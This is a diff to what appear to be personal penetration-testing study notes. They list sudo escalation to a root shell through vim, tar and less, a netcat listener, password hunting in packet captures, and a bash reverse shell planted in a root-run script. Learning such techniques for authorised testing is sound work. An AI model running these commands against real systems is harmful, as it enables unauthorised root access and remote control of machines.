@@ -53,4 +53,27 @@ sudo vim -c ':!/bin/sh'
 
 If the user is allowed in the sudoers file we can easily become root by running _sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh_
 
+#Using and understanding netcat
+
+to set up a listening port in nc
+
+nc -lnvp portnumber
+
+#Read pcaps
+
+Could use wireshark
+
+If you are looking for a password strings will just do the job for it and it will provide more clarity
+
+#Bash remote shell
+
+echo 'bash -c "bash -i >& /dev/tcp/ip/port 0>&1"' > /path/to/script run by root
+
+#Privesc with less
+you can run less with _sudo_ against a file and enter in less's command mode by typing !/bin/sh
+
+Example
+
+sudo less file.log
+!/bin/sh
 
